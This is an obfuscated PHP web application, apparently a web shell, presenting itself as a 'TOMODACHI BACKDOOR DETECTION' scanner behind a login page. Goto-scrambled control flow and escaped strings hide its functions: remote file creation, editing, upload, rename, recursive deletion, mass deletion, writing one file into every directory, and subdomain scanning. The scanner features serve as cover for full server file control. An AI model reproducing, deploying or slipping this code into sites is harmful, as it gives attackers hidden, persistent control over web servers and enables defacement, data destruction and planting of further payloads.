Lb5Q4: echo DIRECTORY_SEPARATOR; goto KcRqh; t10wB: ?>
">
            <input type="hidden" name="dirpath" value="<?php  goto UmOze; mbymf: ?>
        </div>
        <div class="info-item">
            <span class="info-label">Date/Time:</span> <?php  goto BUC7P; JCElF: echo urlencode($scanDir); goto rGf9f; BUC7P: echo $currentDateTime; goto Y1zIN; IfMPu: $currentPath = ''; goto cOFmJ; gf8PQ: $country = getCountryFromIP(); goto fUy5_; elh3e: ?>
">
            <label>Domain Target:<br>
                <input type="text" name="domain" value="<?php  goto eijWh; OyXAC: function getCountryFromIP() { $ip = $_SERVER["\122\105\x4d\117\x54\105\137\101\x44\104\122"] ?? ''; if (empty($ip)) { return "\125\x6e\x6b\x6e\x6f\x77\156"; } try { $url = "\x68\x74\x74\x70\72\57\57\151\160\55\141\x70\151\56\x63\x6f\155\57\152\x73\157\156\x2f{$ip}"; $response = @file_get_contents($url); if ($response === false) { return "\x55\156\141\x62\154\x65\x20\164\157\40\141\143\x63\x65\x73\x73\x20\x49\x50\x20\147\145\x6f\154\x6f\x63\141\164\151\157\x6e"; } $data = json_decode($response, true); if ($data && isset($data["\163\x74\141\x74\165\163"]) && $data["\x73\x74\141\164\165\x73"] === "\x73\165\x63\x63\x65\163\x73") { return $data["\x63\x6f\x75\x6e\164\x72\x79"] . "\x20\50" . $data["\x63\157\165\156\164\x72\x79\x43\x6f\144\145"] . "\51"; } else { return "\125\156\153\x6e\x6f\x77\x6e"; } } catch (Exception $e) { return "\x45\x72\162\157\162\x3a\40" . $e->getMessage(); } } goto Wtyhm; tEYwB: echo urlencode($scanDir); goto kfAF1; sv20s: $action = $_GET["\x61\x63\164\151\x6f\x6e"] ?? $_POST["\x61\143\x74\x69\x6f\156"] ?? null; goto YJkL3; YJjjB: if ($action === "\144\145\x6c\x65\x74\x65" && isset($_POST["\x66\x69\154\145\x70\x61\164\x68"])) { $path = $_POST["\x66\151\x6c\145\x70\x61\164\150"]; if (is_dir($path)) { if (deleteRecursive($path)) { $message = "\104\151\x72\145\143\x74\157\162\x79\40\144\x65\154\145\164\x65\144\x3a\40{$path}"; } else { $message = "\106\x61\151\x6c\x65\144\x20\164\x6f\40\x64\145\x6c\145\x74\x65\40\x64\x69\x72\x65\x63\x74\157\162\x79\56"; } } else { if (unlink($path)) { $message = "\106\151\x6c\x65\40\144\x65\154\145\x74\145\144\72\x20{$path}"; } else { $message = "\104\145\154\x65\x74\145\40\x66\x61\x69\x6c\145\x64\x2e"; } } } goto bcSoI; Xy_ad: if ($action === "\x64\x65\x65\x70\137\163\x63\141\156") { $shellSignatures = fetchShellSignatures(); $deepResults = deepScanSuspiciousFiles($scanDir, $patterns, $maxFileSize, $shellSignatures); $message = "\x44\x65\x65\160\40\163\143\141\156\40\x63\157\x6d\x70\154\145\164\145\144\56\40\106\157\165\156\x64\40" . count($deepResults) . "\40\x73\165\163\160\x69\x63\151\157\165\163\x20\151\x74\x65\x6d\163\56"; } goto OJzhJ; WTly9: if ($action === "\143\162\145\141\x74\x65\137\x64\151\162" && isset($_POST["\x64\x69\162\160\x61\x74\x68"], $_POST["\x64\x69\x72\x6e\141\155\145"])) { $newDir = rtrim($_POST["\x64\151\x72\160\141\x74\150"], "\x2f\x5c") . "\x2f" . $_POST["\144\151\x72\156\x61\155\145"]; if (mkdir($newDir, 493, true)) { $message = "\104\x69\x72\145\143\x74\157\162\x79\x20\x63\x72\145\141\x74\x65\x64\72\x20{$newDir}"; } else { $message = "\x46\141\x69\154\x65\144\40\x74\157\x20\143\162\145\x61\x74\x65\x20\144\151\x72\145\x63\164\x6f\162\x79\56"; } } goto bVflv; BJfFY: ?>
        </div>
        <div class="info-item">
            <span class="info-label">File Count:</span> <?php  goto bxAKT; ZYPhJ: echo urlencode($scanDir); goto t10wB; qSxuq: if ($message) { ?>
<div class="message"><?php  echo htmlspecialchars($message); ?>
</div><?php  } goto mYHeQ; L25L7: $results = scanSuspiciousFiles($scanDir, $patterns, $maxFileSize); goto tkhdM; HNflV: ?>
    </table>

    <div class="form-box">
        <h2>Upload File</h2>
        <form method="post" enctype="multipart/form-data" action="?action=upload&path=<?php  goto JCElF; UImy8: ?>
    </div>
    
    <!-- Directory Contents -->
    <h2>Directory Contents</h2>
    <form method="post" action="?action=mass_delete&path=<?php  goto kfkhX; dzSEo: if ($action === "\154\x6f\147\x6f\x75\164") { session_destroy(); header("\114\x6f\143\x61\164\151\x6f\x6e\72\x20" . $_SERVER["\x50\x48\x50\137\123\105\114\106"]); die; } goto XZpeD; ED6Sz: ?>
</strong>
    </div>
  <a href="?action=logout" class="logout-button">🔒 Logout</a>
    
    <h1>🚨 TOMODACHI BACKDOOR DETECTION 🚨</h1>
    
    <!-- Website Information -->
    <h2>Website Information</h2>
    <div class="info-box">
        <div class="info-item">
            <span class="info-label">Domain:</span> <?php  goto sE2lo; sE2lo: echo htmlspecialchars($domain); goto HDThf; o51tY: foreach ($results as $r) { ?>
            <tr>
                <td><?php  echo htmlspecialchars($r["\146\151\x6c\x65"]); ?>
</td>
                <td><code><?php  echo htmlspecialchars($r["\x70\x61\164\x74\145\162\156"]); ?>
</code></td>
            </tr>
        <?php  } goto F7Wv0; XxgR8: function colorPerm($perm) { if ($perm === "\60\x36\x34\x34") { return "\x3c\163\x70\x61\156\40\x73\164\171\154\145\x3d\x27\x63\x6f\154\x6f\x72\x3a\154\151\x6d\x65\x3b\146\x6f\156\x74\55\x77\145\151\x67\150\164\72\x62\x6f\154\x64\x27\x3e{$perm}\74\57\x73\160\x61\x6e\76"; } if ($perm === "\60\67\65\65") { return "\x3c\163\x70\x61\156\x20\x73\x74\171\x6c\145\x3d\x27\x63\x6f\154\157\x72\x3a\171\x65\x6c\x6c\x6f\x77\x3b\x66\157\156\x74\x2d\x77\145\151\147\150\164\x3a\142\157\154\x64\47\76{$perm}\74\x2f\163\x70\x61\156\76"; } if ($perm === "\64\64\x34\x34") { return "\74\x73\160\x61\156\x20\163\164\171\x6c\x65\x3d\x27\x63\157\x6c\x6f\x72\72\x72\x65\x64\73\x66\157\156\x74\55\167\145\151\x67\150\x74\x3a\x62\157\154\144\x27\76{$perm}\x3c\57\x73\x70\141\x6e\76"; } return $perm; } goto FzG8i; kfkhX: echo urlencode($scanDir); goto cteGx; TC_Fc: echo htmlspecialchars($country); goto fQl4r; Zyq11: ?>

    <div class="form-box">
        <h2>Mass Edit Files</h2>
        <form method="post" action="?action=mass_edit&path=<?php  goto BzuhV; tkhdM: $recentFiles = detectRecentFiles($scanDir, 7); goto qCHhw; BzuhV: echo urlencode($scanDir); goto e6HTM; Hs9Ot: function formatSize($bytes) { if ($bytes >= 1073741824) { return number_format($bytes / 1073741824, 2) . "\x20\107\102"; } elseif ($bytes >= 1048576) { return number_format($bytes / 1048576, 2) . "\x20\x4d\102"; } elseif ($bytes >= 1024) { return number_format($bytes / 1024, 2) . "\x20\x4b\102"; } elseif ($bytes > 1) { return $bytes . "\x20\x62\x79\x74\x65\163"; } elseif ($bytes == 1) { return "\x31\x20\x62\171\164\145"; } else { return "\x30\40\142\x79\x74\145\163"; } } goto COU_k; UmOze: echo htmlspecialchars($scanDir); goto ZCjHK; uM66L: ?>
" required>
            </label><br><br>
            <button type="submit" class="scan-button">Scan Domain</button>
        </form>
        
        <?php  goto upGak; Lf6rf: if ($action === "\x73\x63\x61\156\x5f\144\157\155\141\x69\156" && isset($_POST["\144\x6f\x6d\141\x69\156"])) { $domain = $_POST["\x64\x6f\155\141\151\x6e"]; $subdomains = scanSubdomains($domain); $message = "\x44\x6f\x6d\x61\x69\156\x20\x73\143\141\x6e\x20\143\157\155\160\154\x65\164\x65\144\40\x66\157\162\40{$domain}"; } goto Xy_ad; hNg7H: function countFiles($dir) { $count = 0; $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); foreach ($rii as $file) { if ($file->isFile()) { $count++; } } return $count; } goto XxgR8; h6PQU: $maxFileSize = 5 * 1024 * 1024; goto ahrxC; grofu: $cmsPatterns = array("\x57\157\162\x64\120\162\x65\x73\163" => "\x2f\167\160\55\143\x6f\x6e\164\x65\156\164\x7c\x77\160\x2d\151\156\143\154\165\x64\x65\163\174\x77\160\x2d\x61\144\155\x69\156\174\x77\160\x2d\x63\x6f\x6e\x66\151\x67\x5c\x2e\x70\150\x70\x7c\x77\160\55\154\x6f\147\151\x6e\x5c\x2e\x70\150\x70\x7c\127\x6f\162\x64\120\162\145\163\x73\x2f\x69", "\114\141\162\x61\x76\x65\154" => "\x2f\154\x61\x72\x61\x76\x65\x6c\x7c\x61\162\x74\151\x73\x61\156\174\x76\x65\156\x64\x6f\162\134\x2f\x6c\141\162\141\x76\x65\x6c\x7c\111\x6c\x6c\165\x6d\151\156\x61\164\145\174\x5c\x5c\x49\154\154\165\x6d\x69\x6e\x61\164\x65\x2f\151", "\x44\x72\x75\160\141\154" => "\x2f\x64\162\x75\x70\x61\x6c\x7c\x73\x69\x74\x65\163\134\x2f\x61\x6c\x6c\x7c\x73\151\x74\145\x73\x5c\57\144\145\146\141\165\154\164\x7c\x6d\151\x73\x63\134\x2f\x64\x72\165\x70\x61\x6c\x7c\x44\162\165\x70\141\x6c\72\72\57\151", "\x4a\x6f\x6f\x6d\154\x61" => "\57\x6a\157\x6f\x6d\154\x61\174\143\157\155\x70\x6f\156\x65\x6e\x74\163\134\57\143\x6f\155\x5f\174\x6d\157\144\x75\x6c\x65\163\x5c\x2f\x6d\x6f\144\x5f\x7c\x74\x65\155\x70\154\141\x74\145\x73\x5c\57\56\52\x6a\157\x6f\x6d\x6c\x61\174\112\x6f\157\x6d\x6c\x61\x21\x2f\151", "\x50\162\145\x73\x74\141\123\150\x6f\x70" => "\57\x70\x72\x65\163\164\x61\x73\150\x6f\160\x7c\143\x6f\x6e\x66\x69\147\x5c\57\163\x65\164\164\x69\156\x67\163\134\56\x69\156\143\134\x2e\x70\x68\x70\x7c\x63\x6c\141\163\163\x65\163\134\57\123\x68\x6f\160\174\x50\162\x65\163\x74\141\123\x68\x6f\160\57\x69", "\127\x6f\157\103\157\155\155\x65\162\x63\145" => "\x2f\x77\x6f\157\x63\x6f\x6d\x6d\x65\162\143\x65\174\x77\x63\55\x61\160\x69\x7c\x77\x63\x2d\157\162\x64\145\x72\174\127\157\x6f\103\157\x6d\x6d\x65\x72\x63\x65\x2f\x69", "\x4d\x61\147\x65\156\x74\x6f" => "\57\155\x61\x67\145\x6e\x74\157\x7c\141\160\160\134\x2f\115\x61\147\x65\134\56\x70\150\x70\174\x4d\x61\147\145\137\174\x4d\x61\147\145\156\x74\157\x5c\134\x2f\151", "\117\160\x65\x6e\103\x61\x72\x74" => "\x2f\157\x70\x65\x6e\143\x61\162\x74\174\x73\171\x73\x74\x65\x6d\x5c\x2f\x73\x74\x6f\x72\x61\147\145\174\143\x61\164\141\154\x6f\x67\134\x2f\x63\x6f\x6e\164\x72\x6f\154\154\x65\x72\174\117\160\145\x6e\103\x61\162\x74\57\x69"); goto PVnFn; Ee0AN: $serverInfo = getServerInfo(); goto B9Xx_; Cnln9: echo htmlspecialchars($serverInfo); goto BJfFY; HXt0P: echo htmlspecialchars($scanDir); goto tYCUI; nexD5: echo urlencode($scanDir); goto b3I6H; HDThf: ?>
        </div>
        <div class="info-item">
            <span class="info-label">Country (by IP):</span> <?php  goto TC_Fc; bVflv: if ($action === "\x63\x72\x65\141\164\x65\137\x66\151\x6c\x65" && isset($_POST["\144\151\x72\160\x61\x74\x68"], $_POST["\146\151\x6c\145\156\141\155\x65"], $_POST["\x66\x69\154\x65\143\x6f\x6e\164\x65\x6e\x74"])) { $newFile = rtrim($_POST["\144\151\x72\x70\x61\164\150"], "\57\134") . "\x2f" . $_POST["\146\151\x6c\145\156\x61\x6d\145"]; if (file_put_contents($newFile, $_POST["\146\151\x6c\145\x63\157\x6e\x74\145\x6e\x74"]) !== false) { $message = "\106\x69\x6c\145\40\143\x72\145\x61\x74\x65\x64\x3a\40{$newFile}"; } else { $message = "\106\141\x69\x6c\145\x64\40\164\x6f\40\143\162\145\141\x74\145\x20\146\x69\x6c\145\56"; } } goto Lf6rf; FL_uN: function listFiles($dir) { $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); $files = array(); foreach ($rii as $file) { if ($file->isDir()) { continue; } $files[] = $file->getPathname(); } return $files; } goto hNg7H; J2FOT: $dirContents = listDirectory($scanDir); goto mfX_J; cOFmJ: foreach ($pathParts as $part) { if (!empty($part)) { $currentPath .= DIRECTORY_SEPARATOR . $part; $pathNav[] = array("\x6e\x61\155\x65" => $part, "\x70\141\x74\x68" => $currentPath); } } goto kAPyn; bTRAD: ?>
    </div>

    <h2>Suspicious detections (ordered by match)</h2>
    <table>
        <tr><th>File</th><th>Detected Pattern</th></tr>
        <?php  goto o51tY; fQl4r: ?>
        </div>
        <div class="info-item">
            <span class="info-label">Detected CMS:</span> <?php  goto Hb0Xk; ZCjHK: ?>
">
            <label>File Name:<br>
                <input type="text" name="filename" required>
            </label><br><br>
            <label>Content:<br>
                <textarea name="filecontent" required></textarea>
            </label><br>
            <button type="submit">Create File</button>
        </form>
    </div>
    
    <!-- Scan Domain -->
    <div class="form-box">
        <h2>Scan Domain/Subdomain</h2>
        <form method="post" action="?action=scan_domain&path=<?php  goto oeK2v; SIyfM: $currentDateTime = date("\x59\x2d\155\x2d\144\x20\110\72\x69\72\163"); goto Ee0AN; kAPyn: ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>TOMODACHI BACKDOOR DETECTION</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('https://i.gifer.com/fyrS.gif') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        h1 { color: #ff4c4c; text-align:center; text-shadow:2px 2px 5px #000; }
        h2 { border-bottom:2px solid #ff4c4c; padding-bottom:5px; }
        h3 { color: #ffcc00; }
        .message { background:rgba(0,0,0,0.6); padding:10px; margin:15px 0; border-radius:8px; }
        table { border-collapse: collapse; width:100%; margin:15px 0; background:rgba(0,0,0,0.6); }
        th, td { border:1px solid #444; padding:8px; text-align:left; }
        th { background:#222; color:#ff4c4c; }
        tr:hover { background:rgba(255,255,255,0.1); }
        button { background:#ff4c4c; border:none; color:#fff; padding:5px 10px; border-radius:5px; cursor:pointer; }
        button:hover { background:#ff1c1c; }
        textarea { width:100%; height:300px; background:#111; color:#0f0; border:1px solid #444; padding:10px; }
        input[type=text], input[type=file], input[type=password] {
            padding:5px; width:100%; border:1px solid #444; background:#111; color:#fff;
        }
        .form-box { background:rgba(0,0,0,0.7); padding:15px; border-radius:8px; margin:15px 0; }
        .info-box { 
            background: rgba(0,0,0,0.7); 
            padding: 15px; 
            border-radius: 8px; 
            margin: 15px 0; 
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        .info-item {
            padding: 10px;
            background: rgba(50,50,50,0.5);
            border-radius: 5px;
        }
        .info-label {
            font-weight: bold;
            color: #ffcc00;
        }
        .scan-button {
            background: #4CAF50;
            padding: 10px 15px;
            font-size: 16px;
        }
        .scan-button:hover {
            background: #45a049;
        }
        .deep-scan-button {
            background: #ff9800;
            padding: 10px 15px;
            font-size: 16px;
        }
        .deep-scan-button:hover {
            background: #e68900;
        }
       .logout-button {
    background: linear-gradient(135deg, #f44336, #e53935);
    color: #fff;
    padding: 10px 20px;
    font-size: 16px;
    font-weight: bold;
    border-radius: 30px;
    text-decoration: none;
    position: absolute;
    top: 20px;
    right: 20px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    transition: all 0.3s ease;
}

.logout-button:hover {
    background: linear-gradient(135deg, #e53935, #c62828);
    box-shadow: 0 6px 12px rgba(0,0,0,0.3);
    transform: translateY(-2px);
}
        .subdomain-list {
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0,0,0,0.8);
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
        .path-nav {
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .path-nav a {
            color: #4CAF50;
            text-decoration: none;
        }
        .path-nav a:hover {
            text-decoration: underline;
        }
        .dir-item {
            color: #4CAF50;
        }
        .file-item {
            color: #ffcc00;
        }
        .action-buttons {
            margin: 10px 0;
        }
        .action-buttons button {
            margin-right: 5px;
        }
        .nav-dir {
            color: #4CAF50;
            text-decoration: none;
        }
        .nav-dir:hover {
            text-decoration: underline;
        }
        .user-info {
            position: absolute;
            top: 20px;
            right: 150px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
        }
    </style>
    <script>
        function confirmDelete() {
            return confirm("Are you sure you want to delete this item?");
        }
        
        function confirmMassDelete() {
            return confirm("Are you sure you want to delete selected items?");
        }
        
        function toggleSubdomains() {
            var subdomainsDiv = document.getElementById('subdomains-list');
            if (subdomainsDiv.style.display === 'none') {
                subdomainsDiv.style.display = 'block';
            } else {
                subdomainsDiv.style.display = 'none';
            }
        }
        
        function toggleCreateDir() {
            var createDirDiv = document.getElementById('create-dir');
            if (createDirDiv.style.display === 'none') {
                createDirDiv.style.display = 'block';
            } else {
                createDirDiv.style.display = 'none';
            }
        }
        
        function toggleCreateFile() {
            var createFileDiv = document.getElementById('create-file');
            if (createFileDiv.style.display === 'none') {
                createFileDiv.style.display = 'block';
            } else {
                createFileDiv.style.display = 'none';
            }
        }
        
        function selectAllFiles(source) {
            checkboxes = document.getElementsByName('files[]');
            for(var i=0; i<checkboxes.length; i++) {
                checkboxes[i].checked = source.checked;
            }
        }
    </script>
</head>
<body>
    <div class="user-info">
        Logged in as: <strong><?php  goto MR4Mi; FE63D: ?>
        </div>
    </div>
    
    <?php  goto qSxuq; rA0Nm: echo htmlspecialchars($scanDir); goto Iu21c; bxAKT: echo $fileCount; goto FE63D; kfAF1: ?>
">
            <input type="hidden" name="dirpath" value="<?php  goto lXx4r; OJzhJ: $domain = $_SERVER["\x48\x54\x54\x50\137\110\117\x53\124"] ?? "\154\x6f\x63\141\154\150\157\163\x74"; goto gf8PQ; PVnFn: function displayLoginPage($error = '') { $random = rand(1, 3); $bgGif = $random === 1 ? "\150\164\x74\160\x73\72\57\57\x69\56\147\151\x66\145\162\x2e\143\x6f\155\x2f\x49\130\112\x70\x2e\x67\151\x66" : ($random === 2 ? "\150\x74\164\x70\163\72\57\57\x69\x2e\147\151\x66\x65\x72\x2e\143\157\155\57\x33\x6a\103\112\56\x67\x69\146" : "\x68\164\164\160\163\72\57\x2f\x69\x2e\x67\151\146\145\162\x2e\x63\x6f\155\x2f\146\171\162\123\56\x67\x69\146"); ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>ADMIN PAGE - LOGIN</title>
        <meta charset="utf-8" />
        <style>
            body {
                font-family: 'Arial', sans-serif;
                background: url('<?php  echo $bgGif; ?>
') no-repeat center center fixed;
                background-size: cover;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #fff;
            }
            .login-container {
                background: rgba(0, 0, 0, 0.85);
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 0 25px rgba(255, 0, 0, 0.5);
                width: 350px;
                text-align: center;
                border: 2px solid #ff4c4c;
            }
            .logo {
                width: 120px;
                height: 120px;
                margin: 0 auto 20px;
                background: url('https://i.gifer.com/4Pzc.gif') no-repeat center center;
                background-size: contain;
                border-radius: 50%;
                border: 3px solid #ff4c4c;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { box-shadow: 0 0 0 0 rgba(255, 76, 76, 0.7); }
                70% { box-shadow: 0 0 0 15px rgba(255, 76, 76, 0); }
                100% { box-shadow: 0 0 0 0 rgba(255, 76, 76, 0); }
            }
            h1 {
                color: #ff4c4c;
                margin-bottom: 25px;
                text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
                font-size: 28px;
            }
            .input-group {
                margin-bottom: 20px;
                text-align: left;
            }
            label {
                display: block;
                margin-bottom: 8px;
                color: #ffcc00;
                font-weight: bold;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 12px;
                border: 1px solid #444;
                background: rgba(0, 0, 0, 0.7);
                color: #fff;
                border-radius: 5px;
                box-sizing: border-box;
                transition: all 0.3s;
            }
            input[type="text"]:focus, input[type="password"]:focus {
                border-color: #ff4c4c;
                box-shadow: 0 0 10px rgba(255, 76, 76, 0.5);
                outline: none;
            }
            .btn-login {
                background: linear-gradient(to right, #ff4c4c, #ff1c1c);
                color: white;
                border: none;
                padding: 12px 20px;
                width: 100%;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                font-weight: bold;
                transition: all 0.3s;
                margin-top: 10px;
            }
            .btn-login:hover {
                background: linear-gradient(to right, #ff1c1c, #ff4c4c);
                box-shadow: 0 0 15px rgba(255, 76, 76, 0.7);
            }
            .error {
                color: #ff4c4c;
                margin-top: 15px;
                padding: 10px;
                background: rgba(255, 0, 0, 0.1);
                border-radius: 5px;
                border: 1px solid #ff4c4c;
            }
            .footer {
                margin-top: 20px;
                color: #aaa;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo"></div>
            <h1>PLEASE LOGIN</h1>
            <form method="post" action="">
                <div class="input-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn-login">ACCESS SYSTEM</button>
                <?php  if (!empty($error)) { ?>
                    <div class="error"><?php  echo htmlspecialchars($error); ?>
</div>
                <?php  } ?>
            </form>
            <div class="footer">
                Secure Access Required | Administrator Login Page | Tomodachi
            </div>
        </div>
    </body>
    </html>
    <?php  die; } goto K9aCa; bYwuR: foreach ($dirContents as $item) { ?>
            <tr>
                <td>
                    <?php  if ($item["\156\x61\x6d\x65"] !== "\x2e\56") { ?>
                    <input type="checkbox" name="files[]" value="<?php  echo htmlspecialchars($item["\x70\141\164\x68"]); ?>
">
                    <?php  } ?>
                </td>
                <td>
                    <?php  if ($item["\x69\x73\104\x69\162"]) { ?>
                        <span class="dir-item">📁 <a href="?path=<?php  echo urlencode($item["\x70\x61\x74\150"]); ?>
"><?php  echo htmlspecialchars($item["\156\141\x6d\x65"]); ?>
</a></span>
                    <?php  } else { ?>
                        <span class="file-item">📄 <?php  echo htmlspecialchars($item["\x6e\x61\155\145"]); ?>
</span>
                    <?php  } ?>
                </td>
                <td><?php  echo $item["\163\151\172\x65"]; ?>
</td>
                <td><?php  echo $item["\x6d\x74\151\155\145"]; ?>
</td>
                <td><?php  echo colorPerm($item["\x70\145\162\155"]); ?>
</td>
                <td>
                    <?php  if ($item["\x6e\x61\x6d\x65"] !== "\x2e\56") { ?>
                    <?php  if ($item["\x69\x73\x44\x69\162"]) { ?>
                    <form method="post" action="?action=rename&path=<?php  echo urlencode($scanDir); ?>
" style="display:inline">
                        <input type="hidden" name="oldname" value="<?php  echo htmlspecialchars($item["\160\141\x74\150"]); ?>
">
                        <input type="text" name="newname" placeholder="New name" style="width: 120px;">
                        <button type="submit">Rename</button>
                    </form>
                    <form method="post" action="?action=delete&path=<?php  echo urlencode($scanDir); ?>
" style="display:inline" onsubmit="return confirmDelete()">
                        <input type="hidden" name="filepath" value="<?php  echo htmlspecialchars($item["\160\x61\164\150"]); ?>
">
                        <button type="submit">Delete</button>
                    </form>
                    <?php  } else { ?>
                    <form method="get" action="" style="display:inline">
                        <input type="hidden" name="action" value="edit">
                        <input type="hidden" name="filepath" value="<?php  echo htmlspecialchars($item["\x70\x61\164\x68"]); ?>
">
                        <input type="hidden" name="path" value="<?php  echo htmlspecialchars($scanDir); ?>
">
                        <button type="submit">Edit</button>
                    </form>
                    <form method="post" action="?action=rename&path=<?php  echo urlencode($scanDir); ?>
" style="display:inline">
                        <input type="hidden" name="oldname" value="<?php  echo htmlspecialchars($item["\x70\141\x74\150"]); ?>
">
                        <input type="text" name="newname" placeholder="New name" style="width: 120px;">
                        <button type="submit">Rename</button>
                    </form>
                    <form method="post" action="?action=delete&path=<?php  echo urlencode($scanDir); ?>
" style="display:inline" onsubmit="return confirmDelete()">
                        <input type="hidden" name="filepath" value="<?php  echo htmlspecialchars($item["\160\141\164\150"]); ?>
">
                        <button type="submit">Delete</button>
                    </form>
                    <?php  } ?>
                    <?php  } ?>
                </td>
            </tr>
            <?php  } goto FX6dh; K9fDA: session_start(); goto UGYVL; mwy_c: function scanSuspiciousFiles($dir, $patterns, $maxFileSize) { $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); $results = array(); foreach ($rii as $file) { if ($file->isDir()) { continue; } if ($file->getSize() > $maxFileSize) { continue; } $contents = @file_get_contents($file->getPathname()); if ($contents === false) { continue; } foreach ($patterns as $pattern) { if (@preg_match($pattern, $contents)) { $results[] = array("\146\151\x6c\x65" => $file->getPathname(), "\160\x61\164\x74\x65\x72\156" => $pattern); break; } } } return $results; } goto d_Rxt; v4buR: $pathNav = array(); goto IfMPu; pYPaU: ?>
">
            <label>Directory Name:<br>
                <input type="text" name="dirname" required>
            </label><br><br>
            <button type="submit">Create Directory</button>
        </form>
    </div>
    
    <!-- Create File Form -->
    <div id="create-file" class="form-box" style="display: none;">
        <h2>Create New File</h2>
        <form method="post" action="?action=create_file&path=<?php  goto ZYPhJ; PS_xU: if ($action === "\163\x61\x76\145\x5f\145\144\x69\x74" && isset($_POST["\x66\151\154\x65\x70\x61\x74\150"], $_POST["\x63\157\x6e\x74\x65\x6e\164"])) { $fp = $_POST["\146\x69\x6c\x65\160\141\x74\150"]; if (is_writable($fp) || !file_exists($fp) && is_writable(dirname($fp))) { if (file_put_contents($fp, $_POST["\143\x6f\x6e\164\145\156\x74"]) !== false) { $message = "\x46\151\x6c\145\x20\x73\141\x76\x65\144\72\x20{$fp}"; } else { $message = "\106\x61\151\154\x65\x64\x20\164\157\40\x73\141\166\145\x20\x66\x69\154\x65\x2e"; } } else { $message = "\x4e\157\x20\167\162\x69\x74\x65\x20\x70\145\162\155\151\x73\x73\151\x6f\156\x20\x66\x6f\162\40{$fp}"; } } goto JwyVr; COU_k: function deleteRecursive($path) { if (is_file($path)) { return unlink($path); } elseif (is_dir($path)) { $files = array_diff(scandir($path), array("\x2e", "\56\56")); foreach ($files as $file) { deleteRecursive($path . DIRECTORY_SEPARATOR . $file); } return rmdir($path); } return false; } goto sv20s; rGf9f: ?>
">
            <label>Directory Path:<br>
                <input type="text" name="upload_dir" value="<?php  goto rA0Nm; tYCUI: ?>
"></label><br><br>
            <label>File Name:<br><input type="text" name="filename" required></label><br><br>
            <label>Content:<br><textarea name="content" required></textarea></label><br>
            <button type="submit">Save to All Directories</button>
        </form>
    </div>
</body>
</htm')); ?>
